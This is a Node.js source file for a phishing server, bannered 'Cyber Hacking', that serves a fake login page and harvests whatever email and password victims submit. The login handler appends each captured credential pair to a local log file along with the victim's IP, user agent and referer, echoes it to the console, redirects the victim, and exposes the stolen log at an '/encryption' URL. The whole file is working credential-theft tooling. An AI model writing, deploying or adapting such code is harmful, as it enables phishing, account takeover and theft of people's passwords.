var fs = require('fs');
var http = require('http');
var url = require('url');

var PORT = process.env.PORT || 3000;

var isMobile = function(req) {
    return (new RegExp('Mobile', 'gi')).test(req.headers['user-agent']);
}

http.createServer(function(req, res){
    var url = req.url;
    var mobile = isMobile(req);
    if (req.url === '/favicon.ico') {
 
        return;
    }
    if(url === '/') {
		 if(mobile) serveFile('/public/index', res);
        else serveFile('/public/index', res);
    } 
    else if(url === '/login'){
        if(req.method === 'POST'){
            processData(req, res);
        }
    }
    else if(url === '/encryption') {
        serveFile('/encryption', res, '');
    }
    else {
        res.end('Not Found');
    }

}).listen(PORT, function(){
var banner = 
`
 _____     _ _             _   _           
|     |___|_| |___ ___ ___| |_| |_ ___ ___ 
| | | | .'| | | . |  _| .'| . | . | -_|  _|
|_|_|_|__,|_|_|_  |_| |__,|___|___|___|_|  
              |___|  Cyber Hacking
    para cancelar el servidor presiona ctrol+C
             Autor:Luishiño Pericena Choque
`
console.log(banner)
console.log('Server:' +PORT);
});

function serveFile(path, res, fext) {
    var ct;
    if(!fext) {
        fext = '.html';
        ct = 'text/html'; 
    } else {
        ct = 'text/plain';
    }
    fs.readFile('.'+path+fext, function(err, data){
        if(err) return console.log(err);
        res.writeHead(200, {'Content-Type': ct});
        res.write(data);
        res.end();
    });
}


function processData(req, res) {
    var body = '';
    req.on('data', function (data) {
        body += data;
    });

    req.on('end', function () {
        var s = body.split(/[\=|\&]/);
        req.body = {};
        for(var i=0; i<s.length; i++) {
            if(i%2!=0) {
				
                req.body[s[i-1]] = s[i];
            }
        }
		
        var log =   '\n\ndate: '+new Date()
                    +'\nreferer: '+req.headers['referer']
                    +'\nurl: '+req.url
                    +'\nip: '+ (req.headers['x-forwarded-for'] || req.connection.remoteAddress)
                    +'\nua: '+req.headers['user-agent']
                    +'\nemail: '+req.body.Email
                    +'\npassword: '+req.body.Pass

        fs.appendFile('./Archivos/encryption', log, function(err){
            if(err) return console.log(err);
			console.log(log);
			console.log('         ---- Datos Guardados ------');
            res.end('Logged');
        });

        res.writeHead(302, {'Location': '/'});
        res.end();
    });
}
